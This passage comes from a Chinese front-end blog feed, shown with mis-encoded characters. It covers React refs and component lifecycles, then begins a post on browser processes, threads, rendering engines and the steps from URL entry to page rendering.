å¸Œæœ›åœ¨çˆ¶ç»„ä»¶æ±‡æ€»å¼•ç”¨å­èŠ‚ç‚¹çš„DOMèŠ‚ç‚¹ã€‚<br>ä¸èƒ½Refé«˜é˜¶ç»„ä»¶ï¼ˆconnectåˆ°reduxçš„HOCç»„ä»¶ï¼‰ï¼Œrefå‡ºæ¥çš„ä¼šæ˜¯é«˜é˜¶ç»„ä»¶ï¼Œä¸æ˜¯æœ¬ç»„ä»¶ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Child</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span></span>&#123;</span><br><span class="line">  state = &#123;</span><br><span class="line">    visible: <span class="literal">false</span>,</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">showModal() &#123;</span><br><span class="line"><span class="keyword">this</span>.setState(&#123;</span><br><span class="line">visible: <span class="literal">true</span>,</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">render() &#123;</span><br><span class="line"><span class="keyword">return</span> (</span><br><span class="line">&lt;&gt;</span><br><span class="line">&#123; <span class="keyword">this</span>.state.visible &amp;&amp; <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>modal<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>&#125;</span><br><span class="line">&lt;<span class="regexp">/&gt;</span></span><br><span class="line"><span class="regexp">)</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">class Parent extends React.Component&#123;</span></span><br><span class="line"><span class="regexp">constructor(props)&#123;</span></span><br><span class="line"><span class="regexp">super(props);</span></span><br><span class="line"><span class="regexp">this.myRef = React.createRef()</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">handleClick = () =&gt; &#123;</span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/ è°ƒç”¨å­ç»„ä»¶æ–¹æ³•</span></span><br><span class="line"><span class="regexp">const node = this.myRef.current;</span></span><br><span class="line"><span class="regexp">node.showModal();</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">render() &#123;</span></span><br><span class="line"><span class="regexp">return (</span></span><br><span class="line"><span class="regexp">&lt;&gt;</span></span><br><span class="line"><span class="regexp">&lt;button onClick=&#123;handleClick&#125;&gt;è§¦å‘å­ç»„ä»¶æ–¹æ³•&lt;/</span>button&gt;</span><br><span class="line">&lt;Child ref=&#123;<span class="keyword">this</span>.myRef&#125; /&gt;</span><br><span class="line">&lt;<span class="regexp">/&gt;</span></span><br><span class="line"><span class="regexp">)</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="4-ç”Ÿå‘½å‘¨æœŸ"><a href="#4-ç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="4. ç”Ÿå‘½å‘¨æœŸ"></a>4. ç”Ÿå‘½å‘¨æœŸ</h3><h4 id="4-1-æŒ‚è½½"><a href="#4-1-æŒ‚è½½" class="headerlink" title="4.1 æŒ‚è½½"></a>4.1 æŒ‚è½½</h4><p>å½“ç»„ä»¶å®ä¾‹è¢«åˆ›å»ºå¹¶æ’å…¥DOMä¸­æ—¶ï¼Œå…¶ç”Ÿå‘½å‘¨æœŸè°ƒç”¨é¡ºåºå¦‚ä¸‹</p><ul><li>constructor</li><li>getDerivedStateFromProps</li><li>render</li><li>componentDidMount</li></ul><p><br></p><h4 id="4-2-æ›´æ–°"><a href="#4-2-æ›´æ–°" class="headerlink" title="4.2 æ›´æ–°"></a>4.2 æ›´æ–°</h4><p>å½“ç»„ä»¶çš„propsæˆ–stateå‘ç”Ÿå˜åŒ–æ—¶ä¼šè§¦å‘æ›´æ–°ã€‚ç»„ä»¶æ›´æ–°çš„ç”Ÿå‘½å‘¨æœŸè°ƒç”¨é¡ºåºå¦‚ä¸‹</p><ul><li>getDerivedStateFromProps </li><li>shouldComponentUpdate </li><li>render </li><li>getSnapshotBeforeUpdate </li><li>componentDidUpdate</li></ul><p><br></p><h4 id="4-3-å¸è½½"><a href="#4-3-å¸è½½" class="headerlink" title="4.3 å¸è½½"></a>4.3 å¸è½½</h4><p>å½“ç»„ä»¶ä»DOMä¸­ç§»é™¤ä¹‹å‰ï¼Œä¼šè°ƒç”¨</p><ul><li>compoenntWillMount</li></ul><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><p><a href="https://github.com/xitu/gold-miner/blob/master/TODO/our-best-practices-for-writing-react-components.md" target="_blank" rel="noopener">https://github.com/xitu/gold-miner/blob/master/TODO/our-best-practices-for-writing-react-components.md</a><br><a href="https://juejin.im/post/5a73d6435188257a6a789d0d" target="_blank" rel="noopener">https://juejin.im/post/5a73d6435188257a6a789d0d</a></p><ul><li><a href="https://www.jianshu.com/p/50fe3fb9f7c3" target="_blank" rel="noopener">Reactæ–°ç”Ÿå‘½å‘¨æœŸâ€“getDerivedStateFromProps</a><br><code>`</code></li></ul>]]></content>
      
      <categories>
          
          <category> React </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>ğŸ¤” ä»è¾“å…¥URLåˆ°é¡µé¢æ˜¾ç¤ºå‘ç”Ÿäº†ä»€ä¹ˆï¼Ÿ</title>
      <link href="/2019/06/13/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
      <url>/2019/06/13/%E6%B5%8F%E8%A7%88%E5%99%A8/</url>
      <content type="html"><![CDATA[<blockquote><p>ç»å†äº†DNSæŸ¥è¯¢ -&gt; TCPè¿æ¥ -&gt; HTTPè¯·æ±‚ -&gt; æœåŠ¡å™¨å“åº” -&gt; æµè§ˆå™¨è§£æHTMLï¼Œæ„å»ºDOMæ ‘ -&gt; è§£æCSSï¼Œç”ŸæˆCSSè§„åˆ™æ ‘ -&gt; åˆå¹¶ä¸¤é¢—æ ‘ï¼Œç”Ÿæˆrender tree -&gt; å¸ƒå±€renderæ ‘ï¼Œè´Ÿè´£å„å…ƒç´ å°ºå¯¸ã€ä½ç½®çš„è®¡ç®— -&gt; ç»˜åˆ¶renderæ ‘ï¼Œç»˜åˆ¶é¡µé¢åƒç´ ä¿¡æ¯ -&gt; æµè§ˆå™¨å°†å„å±‚çš„ä¿¡æ¯å‘é€ç»™GPU, GPUä¼šå°†å„å±‚åˆæˆ,æ˜¾ç¤ºåœ¨å±å¹•ä¸Š</p></blockquote><h3 id="1-å¤šè¿›ç¨‹çš„æµè§ˆå™¨"><a href="#1-å¤šè¿›ç¨‹çš„æµè§ˆå™¨" class="headerlink" title="1. å¤šè¿›ç¨‹çš„æµè§ˆå™¨"></a>1. å¤šè¿›ç¨‹çš„æµè§ˆå™¨</h3><p>æµè§ˆå™¨æ˜¯å¤šè¿›ç¨‹çš„ï¼ŒåŒ…æ‹¬ä¸»æ§è¿›ç¨‹ï¼Œæ’ä»¶è¿›ç¨‹ï¼ŒGPUï¼Œæ¯ä¸€ä¸ªtabé¡µéƒ½ä¼šæ–°å¼€ä¸€ä¸ªè¿›ç¨‹ï¼ˆæŸäº›æƒ…å†µä¸‹å¤šä¸ªtabä¼šåˆå¹¶è¿›ç¨‹ï¼‰ã€‚</p><ul><li>Browserè¿›ç¨‹ï¼š æµè§ˆå™¨çš„ä¸»è¿›ç¨‹ï¼ˆè´Ÿè´£åè°ƒã€ä¸»æ§ï¼‰ï¼Œåªæœ‰ä¸€ä¸ª</li><li>ç¬¬ä¸‰æ–¹æ’ä»¶è¿›ç¨‹ï¼š æ¯ä¸ªç±»å‹çš„æ’ä»¶å¯¹åº”ä¸€ä¸ªè¿›ç¨‹ï¼Œä»…å½“ä½¿ç”¨è¯¥æ’ä»¶æ—¶æ‰åˆ›å»º</li><li>GUPè¿›ç¨‹ï¼š æœ€å¤šä¸€ä¸ªï¼Œç”¨äº3Dç»˜åˆ¶</li><li>æµè§ˆå™¨æ¸²æŸ“è¿›ç¨‹ï¼ˆå†…æ ¸ï¼‰ï¼š é»˜è®¤æ¯ä¸ªtabé¡µé¢éƒ½ä¼šæ–°å¼€ä¸€ä¸ªè¿›ç¨‹ï¼Œäº’ä¸å½±å“ï¼Œæ§åˆ¶é¡µé¢æ¸²æŸ“ï¼Œè„šæœ¬æ‰§è¡Œï¼Œäº‹ä»¶å¤„ç†ç­‰ã€‚ï¼ˆæœ‰æ—¶ä¼šä¼˜åŒ–ï¼Œå¦‚å¤šä¸ªç©ºç™½tabä¼šåˆå¹¶æˆä¸€ä¸ªè¿›ç¨‹ï¼‰ã€‚</li></ul><p><br><br><img src="/2019/06/13/æµè§ˆå™¨/1.png" style="max-width:400px"><br>éœ€è¦æ³¨æ„ï¼Œæµè§ˆå™¨å’Œæµè§ˆå™¨å†…æ ¸æ˜¯ä¸åŒçš„æ¦‚å¿µï¼Œæµè§ˆå™¨æŒ‡çš„æ˜¯Chrome, Firefoxï¼Œè€Œæµè§ˆå™¨å†…æ ¸æ˜¯Blink, Gecko, æµè§ˆå™¨å†…æ ¸åªè´Ÿè´£æ¸²æŸ“ï¼ŒGUIåŠç½‘ç»œè¿æ¥ç­‰è·¨å¹³å°å·¥ä½œåˆ™æ˜¯æµè§ˆå™¨å®ç°çš„ã€‚</p><p><br></p><h3 id="2-æµè§ˆå™¨æ¸²æŸ“è¿›ç¨‹-å†…æ ¸"><a href="#2-æµè§ˆå™¨æ¸²æŸ“è¿›ç¨‹-å†…æ ¸" class="headerlink" title="2. æµè§ˆå™¨æ¸²æŸ“è¿›ç¨‹(å†…æ ¸)"></a>2. æµè§ˆå™¨æ¸²æŸ“è¿›ç¨‹(å†…æ ¸)</h3><p>æ¯æ–°å»ºä¸€ä¸ªtabé¡µé¢ä¼šæ–°å¼€ä¸€ä¸ªæµè§ˆå™¨æ¸²æŸ“è¿›ç¨‹ï¼Œè¿™ä¸ªè¿›ç¨‹æ˜¯å¤šçº¿ç¨‹çš„ï¼Œç”¨æ¥å¤„ç†é¡µé¢çš„æ¸²æŸ“ï¼ŒJSçš„æ‰§è¡Œï¼Œäº‹ä»¶çš„å¾ªç¯ã€‚</p><p><br></p><h4 id="2-1-å­çº¿ç¨‹"><a href="#2-1-å­çº¿ç¨‹" class="headerlink" title="2.1 å­çº¿ç¨‹"></a>2.1 å­çº¿ç¨‹</h4><p>æµè§ˆå™¨æ¸²æŸ“è¿›ç¨‹ï¼Œæœ‰å‡ å¤§ç±»å­çº¿ç¨‹ï¼š</p><h5 id="2-1-1-GUIæ¸²æŸ“çº¿ç¨‹"><a href="#2-1-1-GUIæ¸²æŸ“çº¿ç¨‹" class="headerlink" title="2.1.1 GUIæ¸²æŸ“çº¿ç¨‹"></a>2.1.1 GUIæ¸²æŸ“çº¿ç¨‹</h5><ul><li>è´Ÿè´£æ¸²æŸ“æµè§ˆå™¨ç•Œé¢ï¼Œè§£æHTML, CSS, æ„å»ºDOMæ ‘å’ŒRenderObjectæ ‘ï¼Œå¸ƒå±€å’Œç»˜åˆ¶ç­‰ã€‚</li><li>å½“ç•Œé¢éœ€è¦é‡ç»˜(Repaint) æˆ–ç”±äºæŸç§æ“ä½œå¼•å‘å›æµ(reflow)æ—¶ï¼Œè¯¥çº¿ç¨‹å°±ä¼šæ‰§è¡Œ</li><li>æ³¨æ„ï¼ŒGUIæ¸²æŸ“çº¿ç¨‹å’ŒJSå¼•æ“çº¿ç¨‹æ˜¯äº’æ–¥çš„ï¼Œå½“JSå¼•æ“æ‰§è¡Œæ—¶GUIçº¿ç¨‹ä¼šè¢«æŒ‚èµ·ï¼ŒGUIæ›´æ–°ä¼šè¢«ä¿å­˜åœ¨ä¸€ä¸ªé˜Ÿåˆ—ä¸­ç­‰åˆ°JSå¼•æ“ç©ºé—²æ—¶ç«‹å³è¢«æ‰§è¡Œã€‚ </li></ul><p>ï¼ˆç”±äºJavascriptå¯ä»¥æ“çºµDOMï¼Œå¦‚æœä¿®æ”¹è¿™äº›å…ƒç´ å±æ€§åŒæ—¶æ¸²æŸ“é¡µé¢ï¼Œé‚£ä¹ˆæ¸²æŸ“çº¿ç¨‹å‰åè·å¾—çš„å…ƒç´ æ•°æ®å°±å¯èƒ½ä¸ä¸€è‡´ï¼Œä¸ºäº†é˜²æ­¢æ¸²æŸ“å‡ºç°ä¸å¯é¢„æœŸçš„ç»“æœï¼Œæµè§ˆå™¨è®¾ç½®GUIæ¸²æŸ“çº¿ç¨‹ä¸JSäº’æ–¥çš„å…³ç³»ã€‚ï¼‰</p><h5 id="2-1-2-JSå¼•æ“çº¿ç¨‹"><a href="#2-1-2-JSå¼•æ“çº¿ç¨‹" class="headerlink" title="2.1.2 JSå¼•æ“çº¿ç¨‹"></a>2.1.2 JSå¼•æ“çº¿ç¨‹</h5><ul><li>ä¹Ÿæˆä¸ºJSå†…æ ¸ï¼Œè´Ÿè´£å¤„ç†Javascriptè„šæœ¬ç¨‹åºï¼ˆå¦‚V8å¼•æ“ï¼‰</li><li>JSå¼•æ“çº¿ç¨‹è´Ÿè´£è§£æJavascriptè„šæœ¬ï¼Œè¿è¡Œä»£ç </li><li>JSå¼•æ“ä¸€ç›´ç­‰å¾…ç€ä»»åŠ¡é˜Ÿåˆ—ä¸­ä»»åŠ¡çš„åˆ°æ¥ï¼Œç„¶ååŠ ä»¥å¤„ç†ã€‚</li><li>GUIæ¸²æŸ“çº¿ç¨‹ä¸JSå¼•æ“çº¿ç¨‹æ˜¯äº’æ–¥çš„ï¼Œå¦‚æœJSæ‰§è¡Œçš„æ—¶é—´è¿‡é•¿ï¼Œå°±ä¼šé€ æˆé¡µé¢çš„æ¸²æŸ“ä¸è¿è´¯ï¼Œå¯¼è‡´é¡µé¢æ¸²æŸ“åŠ è½½é˜»å¡ã€‚</li></ul><h5 id="2-1-3-äº‹ä»¶è§¦å‘çº¿ç¨‹"><a href="#2-1-3-äº‹ä»¶è§¦å‘çº¿ç¨‹" class="headerlink" title="2.1.3 äº‹ä»¶è§¦å‘çº¿ç¨‹"></a>2.1.3 äº‹ä»¶è§¦å‘çº¿ç¨‹</h5><ul><li>å½“JSå¼•æ“æ‰§è¡Œä»£ç å—å¦‚setTimeOutï¼Œç»‘å®šé¼ æ ‡ç‚¹å‡»ï¼Œajaxå¼‚æ­¥è¯·æ±‚ï¼Œä¼šå°†å¯¹åº”ä»»åŠ¡æ·»åŠ åˆ°äº‹ä»¶çº¿ç¨‹ä¸­ã€‚</li><li>å½“å¯¹åº”çš„äº‹ä»¶è§¦å‘æ¡ä»¶è¢«è§¦å‘æ—¶ï¼Œè¯¥çº¿ç¨‹ä¼šæŠŠæ—¶é—´æ·»åŠ åˆ°å¾…å¤„ç†é˜Ÿåˆ—çš„é˜Ÿå°¾ï¼Œç­‰å¾…JSå¼•æ“çš„å¤„ç†</li><li>ç”±äºJSçš„å•çº¿ç¨‹å…³ç³»ï¼Œè¿™äº›å¾…å¤„ç†é˜Ÿåˆ—ä¸­çš„äº‹ä»¶ï¼Œåªåœ¨JSå¼•æ“ç©ºé—²æ—¶æ‰ä¼šå»æ‰§è¡Œ</li></ul><h5 id="2-1-4-å®šæ—¶è§¦å‘å™¨çº¿ç¨‹"><a href="#2-1-4-å®šæ—¶è§¦å‘å™¨çº¿ç¨‹" class="headerlink" title="2.1.4 å®šæ—¶è§¦å‘å™¨çº¿ç¨‹"></a>2.1.4 å®šæ—¶è§¦å‘å™¨çº¿ç¨‹</h5><ul><li><em><code>setInterval</code></em>ä¸<em><code>setTimeout</code></em>æ‰€åœ¨çº¿ç¨‹</li><li>æµè§ˆå™¨å®šæ—¶è®¡æ•°å™¨ä¸æ˜¯ç”±JSå¼•æ“è®¡æ•°çš„ï¼ˆå› ä¸ºJavascriptå¼•æ“æ˜¯å•çº¿ç¨‹çš„ï¼Œå¦‚æœå¤„äºé˜»å¡çº¿ç¨‹çŠ¶æ€ï¼Œè®¡æ—¶å°†ä¸å‡†ç¡®ï¼‰</li><li>å› æ­¤é€šè¿‡å•ç‹¬çº¿ç¨‹æ¥è®¡æ—¶å¹¶è§¦å‘å®šæ—¶ï¼ˆè®¡æ—¶å®Œæ¯•åï¼Œæ·»åŠ åˆ°äº‹ä»¶é˜Ÿåˆ—ä¸­ï¼Œç­‰å¾…JSå¼•æ“ç©ºé—²æ—¶æ‰§è¡Œï¼‰</li></ul><h5 id="2-1-5-å¼‚æ­¥httpè¯·æ±‚çº¿ç¨‹"><a href="#2-1-5-å¼‚æ­¥httpè¯·æ±‚çº¿ç¨‹" class="headerlink" title="2.1.5 å¼‚æ­¥httpè¯·æ±‚çº¿ç¨‹"></a>2.1.5 å¼‚æ­¥httpè¯·æ±‚çº¿ç¨‹</h5><ul><li>å‘èµ·XMLHttpRequestè¿æ¥åï¼Œæµè§ˆå™¨ä¼šæ–°å¼€ä¸€ä¸ªçº¿ç¨‹å¤„ç†è¯·æ±‚<br>ï¼ˆä¸€ä¸ªhttpä¸€ä¸ªçº¿ç¨‹ï¼Ÿï¼‰</li><li>åœ¨æ£€æµ‹åˆ°çŠ¶æ€å˜æ›´æ—¶ï¼Œå¦‚æœè®¾ç½®æœ‰å›è°ƒå‡½æ•°ï¼Œå¼‚æ­¥çº¿ç¨‹å°±ä¼šäº§ç”ŸçŠ¶æ€å˜æ›´äº‹ä»¶ï¼Œå°†è¿™ä¸ªå›è°ƒå†æ”¾å…¥äº‹ä»¶é˜Ÿåˆ—ä¸­ã€‚ç”±JSå¼•æ“æ‰§è¡Œã€‚</li></ul><p><br></p><h4 id="2-2-å¸¸è§æµè§ˆå™¨å†…æ ¸"><a href="#2-2-å¸¸è§æµè§ˆå™¨å†…æ ¸" class="headerlink" title="2.2 å¸¸è§æµè§ˆå™¨å†…æ ¸"></a>2.2 å¸¸è§æµè§ˆå™¨å†…æ ¸</h4><p>æµè§ˆå™¨æ¸²æŸ“è¿›ç¨‹ï¼ŒæŒ‡çš„å°±æ˜¯æˆ‘ä»¬å¹³æ—¶æ‰€è¯´çš„æµè§ˆå™¨å†…æ ¸ã€‚æµè§ˆå™¨å†…æ ¸å¯ä»¥åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼š æ¸²æŸ“å¼•æ“å’ŒJSå¼•æ“ã€‚<em>æ¸²æŸ“å¼•æ“</em>è´Ÿè´£å–å¾—ç½‘é¡µçš„å†…å®¹ï¼ˆHTML, XML, å›¾åƒç­‰ç­‰ï¼‰ã€æ•´ç†è®¯æ¯ï¼ˆåŠ å…¥CSSï¼‰, ä»¥åŠè®¡ç®—ç½‘é¡µçš„æ˜¾ç¤ºæ–¹å¼ï¼Œç„¶åè¾“å‡ºè‡³æ˜¾ç¤ºå™¨æˆ–æ‰“å°æœºã€‚<em>JSå¼•æ“</em>ï¼Œåˆ™æ˜¯è§£æå’Œæ‰§è¡Œjavascriptã€‚</p><p>æœ€å¼€å§‹æ¸²æŸ“å¼•æ“å’ŒJSå¼•æ“æ²¡æœ‰åŒºåˆ†çš„å¾ˆæ˜ç¡®ï¼Œåæ¥JSå¼•æ“è¶Šæ¥è¶Šç‹¬ç«‹ï¼Œå†…æ ¸å°±å€¾å‘äºåªæŒ‡æ¸²æŸ“å¼•æ“ã€‚å¸¸è§çš„æµè§ˆå™¨å†…æ ¸ï¼šTridentï¼ˆIEå†…æ ¸ï¼‰ï¼Œ</p><p><em>1. Trident(IEå†…æ ¸)</em><br>IEå†…æ ¸åœ¨1997å¹´çš„IE4ä¸­é¦–æ¬¡è¢«é‡‡ç”¨ï¼Œæ˜¯å¾®è½¯åœ¨Mosaic(äººç±»ç¬¬ä¸€ä¸ªæµè§ˆå™¨)ä»£ç åŸºç¡€ä¸Šä¿®æ”¹è€Œæ¥çš„ï¼Œå¹¶æ²¿ç”¨åˆ°IE11ã€‚IEå†…æ ¸æ›¾ç»å‡ ä¹ä¸W3Cæ ‡å‡†è„±èŠ‚ï¼ˆ2005å¹´ï¼‰ï¼Œå†…æ ¸ä¸­å¤§é‡bugç­‰å®‰å…¨æ€§é—®é¢˜ä¹Ÿæ²¡æœ‰å¾—åˆ°åŠæ—¶è§£å†³ã€‚å›½å†…å¾ˆå¤šåŒæ ¸æµè§ˆå™¨çš„å…¶ä¸­ä¸€æ ¸ä¾¿æ˜¯Trident,ç¾å…¶åæ›°â€œå…¼å®¹æ¨¡å¼â€ã€‚Window10å‘å¸ƒåï¼ŒIEå°†å…¶å†…ç½®æµè§ˆå™¨å‘½åä¸ºEdge, Edgeæœ€æ˜¾è‘—çš„ç‰¹ç‚¹å°±æ˜¯æ–°å†…æ ¸EdgeHTMLã€‚</p><p><em>2. Geckoï¼ˆFirefoxï¼‰</em><br>Netscape6, Mozilla Firefoxä¹Ÿé‡‡ç”¨äº†è¯¥å†…æ ¸ã€‚Geckoå¼•æ“ä¸IEä¸æ— å…³ç³»ï¼ŒIEæ²¡æœ‰ä½¿ç”¨W3Cæ ‡å‡†ï¼Œå¯¼è‡´äº†å¾®è½¯å†…éƒ¨ä¸€äº›å¼€å‘äººå‘˜çš„ä¸æ»¡ï¼Œä»–ä»¬ä¸å½“æ—¶å·²ç»åœæ­¢æ›´æ–°äº†çš„Netscapeçš„ä¸€äº›å‘˜å·¥ï¼Œä¸€èµ·åˆ›åŠäº†Mozillaã€‚</p><p><em>3. Webkitï¼ˆSafariï¼‰</em><br>å½“å¹´è‹¹æœåœ¨æ¯”è¾ƒäº†Geckoå’ŒKHTMLåï¼Œé€‰æ‹©äº†åè€…æ¥åšå¼•æ“å¼€å‘ï¼Œæ˜¯å› ä¸ºKHTMLæ‹¥æœ‰æ¸…æ™°çš„æºç ç»“æ„å’Œæå¿«çš„æ¸²æŸ“é€Ÿåº¦ã€‚Webkitå†…æ ¸ å¯ä»¥è¯´æ˜¯ä»¥ç¡¬ä»¶ç›ˆåˆ©ä¸ºä¸»çš„è‹¹æœå…¬å¸ç»™è½¯ä»¶è¡Œä¸šçš„æœ€å¤§è´¡çŒ®ä¹‹ä¸€ã€‚éšåï¼Œ2008å¹´è°·æ­Œå…¬å¸å‘å¸ƒChormeæµè§ˆå™¨ï¼Œé‡‡ç”¨çš„chromiumå†…æ ¸å°±æ˜¯forkäº†Webkit</p><p><em>4. Chromium/Blinkï¼ˆChromeï¼‰</em><br>2008å¹´ï¼Œè°·æ­Œå…¬å¸å‘å¸ƒäº†chromeæµè§ˆå™¨ï¼Œæµè§ˆå™¨ä½¿ç”¨çš„å†…æ ¸è¢«å‘½åä¸ºchromiumã€‚choromium forkå­—å¼€æºå¼•æ“webkitã€‚è°·æ­Œå…¬å¸è¿˜ç ”å‘äº†è‡ªå·±çš„javascriptå¼•æ“ï¼ŒV8,æå¤§åœ°æé«˜äº†javascriptçš„è¿ç®—é€Ÿåº¦ã€‚chromiumé—®ä¸–åï¼Œä¸€äº›åŸºäºchromiumçš„å•æ ¸ï¼ŒåŒæ ¸æµè§ˆå™¨æ‹”åœ°è€Œèµ·ï¼Œå¦‚æœç‹—ã€360ã€qqæµè§ˆå™¨ã€‚2013å¹´ï¼Œè°·æ­Œå‘è¡¨å°†äºwebkitåˆ†é“æ‰¬é•³ï¼Œåœ¨chromiumé¡¹ç›®ä¸­ç ”å‘Blinkæ¸²æŸ“å¼•æ“ï¼Œå†…ç½®äºChormeæµè§ˆå™¨ä¸­ã€‚</p><p><em>5. ç§»åŠ¨ç«¯å†…ç½®æµè§ˆå™¨å†…æ ¸</em><br>ç›®å‰ç§»åŠ¨è®¾å¤‡æµè§ˆå™¨ä¸Šå¸¸ç”¨çš„å†…æ ¸æœ‰Webkit, Blink, Trident, Geckoç­‰ã€‚å…¶ä¸­iphoneå’ŒiPadç­‰ioså¹³å°ä¸»è¦æ˜¯webkit, Android 4.4ä¹‹å‰å®‰å“ç³»ç»Ÿæµè§ˆå™¨å†…æ ¸æ˜¯webkitï¼Œ androidç³»ç»Ÿæµè§ˆå™¨åˆ‡æ¢åˆ°chromiumã€‚Window Phone 8ç³»ç»Ÿæµè§ˆå™¨å†…æ ¸æ˜¯Tridentã€‚</p><p><br><br><br></p><h3 id="3-è§£æURL"><a href="#3-è§£æURL" class="headerlink" title="3. è§£æURL"></a>3. è§£æURL</h3><p>å½“æ“ä½œç³»ç»ŸGUIå°†è¾“å…¥äº‹ä»¶ä¼ é€’åˆ°äº†æµè§ˆå™¨ï¼Œåœ¨è¿™è¿‡ç¨‹ä¸­ï¼Œæµè§ˆå™¨å¯èƒ½ä¼šåšä¸€äº›é¢„å¤„ç†ï¼Œæ¯”å¦‚Chromeä¼šæ ¹æ®å†å²ç»Ÿè®¡æ¥é¢„ä¼°è¾“å…¥å­—ç¬¦å¯¹åº”çš„ç½‘ç«™ã€‚æ¯”å¦‚è¾“å…¥äº†<code>[ba]</code>,æ ¹æ®ä¹‹å‰çš„å†å²å‘ç°90%çš„æ¦‚ç‡ä¼šè®¿é—®<code>[www.baidu.com]</code>ï¼Œå› æ­¤å°±ä¼šåœ¨è¾“å…¥å›è½¦å‰å¼€å§‹å»ºç«‹TCPé“¾æ¥ç”šè‡³æ¸²æŸ“äº†ã€‚</p><p>è¾“å…¥URLåçš„[å›è½¦]ï¼Œè¿™æ—¶æµè§ˆå™¨ä¼šè¿›è¡Œæ£€æŸ¥ï¼Œé¦–å…ˆåˆ¤æ–­åè®®ï¼Œå¦‚æœæ˜¯httpå°±æŒ‰ç…§webæ¥å¤„ç†ï¼Œè°ƒç”¨æµè§ˆå™¨å†…æ ¸ä¸­çš„å¯¹åº”æ–¹æ³•ï¼Œå¦‚WebViewä¸­çš„loadUrlæ–¹æ³•ã€‚ä»åº”ç”¨è§’åº¦çœ‹ï¼Œä¸»è¦åšä¸¤ä»¶äº‹ä»¶ï¼šé€šè¿‡DNSæŸ¥è¯¢IPï¼Œé€šè¿‡Socketå‘é€æ•°æ®ã€‚<em>æ¯ä¸ªç½‘ç»œè¯·æ±‚æ—¶éƒ½éœ€è¦å¼€è¾Ÿå•ç‹¬çš„çº¿ç¨‹è¿›è¡Œã€‚</em></p><p><br><br><img src="/2019/06/13/æµè§ˆå™¨/2.png" style="max-width:500px"></p><h3 id="4-æµè§ˆå™¨æ¸²æŸ“é¡µé¢"><a href="#4-æµè§ˆå™¨æ¸²æŸ“é¡µé¢" class="headerlink" title="4. æµè§ˆå™¨æ¸²æŸ“é¡µé¢"></a>4. æµè§ˆå™¨æ¸²æŸ“é¡µé¢</h3><p>ä»è€—æ—¶çš„è§’åº¦ï¼Œæµè§ˆå™¨è¯·æ±‚ã€åŠ è½½ã€æ¸²æŸ“ä¸€ä¸ªé¡µé¢ï¼Œæ—¶é—´èŠ±åœ¨ä¸‹é¢äº”ä»¶äº‹ä»¶ä¸Šï¼š</p><ul><li>DNSæŸ¥è¯¢</li><li>TCPè¿æ¥</li><li>HTTPè¯·æ±‚</li><li>æœåŠ¡å™¨å“åº”</li><li>å®¢æˆ·ç«¯æ¸²æŸ“</li></ul><p>æµè§ˆå™¨å¯¹å†…å®¹çš„æ¸²æŸ“ï¼ˆæ¸²æŸ“æ ‘æ„å»ºã€å¸ƒå±€åŠç»˜åˆ¶ï¼‰ï¼Œåˆå¯ä»¥åˆ†ä¸ºä¸‹é¢å‡ ä¸ªæ­¥éª¤ï¼š</p><ul><li>è§£æHTMLï¼Œæ„å»ºDOMæ ‘</li><li>è§£æCSSï¼Œç”ŸæˆCSSè§„åˆ™æ ‘</li><li>åˆå¹¶DOMæ ‘å’ŒCSSè§„åˆ™æ ‘ï¼Œç”Ÿæˆrenderæ ‘</li><li>å¸ƒå±€renderæ ‘ï¼ˆLayout/reflowï¼‰ï¼Œè´Ÿè´£å„å…ƒç´ å°ºå¯¸ã€ä½ç½®çš„è®¡ç®—</li><li>ç»˜åˆ¶renderæ ‘ï¼ˆpaintï¼‰,ç»˜åˆ¶é¡µé¢åƒç´ ä¿¡æ¯</li><li>æµè§ˆå™¨ä¼šå°†å„å±‚çš„ä¿¡æ¯å‘é€ç»™GPU, GPUä¼šå°†å„å±‚åˆæˆï¼ˆcompositeï¼‰,æ˜¾ç¤ºåœ¨å±å¹•ä¸Š</li></ul><p><img src="/2019/06/13/æµè§ˆå™¨/3.png"></p><p>å¦‚æœDOMæˆ–CSSDOMè¢«ä¿®æ”¹ï¼Œä¸Šé¢çš„è¿‡ç¨‹éœ€è¦é‡å¤æ‰§è¡Œï¼Œæ‰èƒ½è®¡ç®—å‡ºå“ªäº›åƒç´ 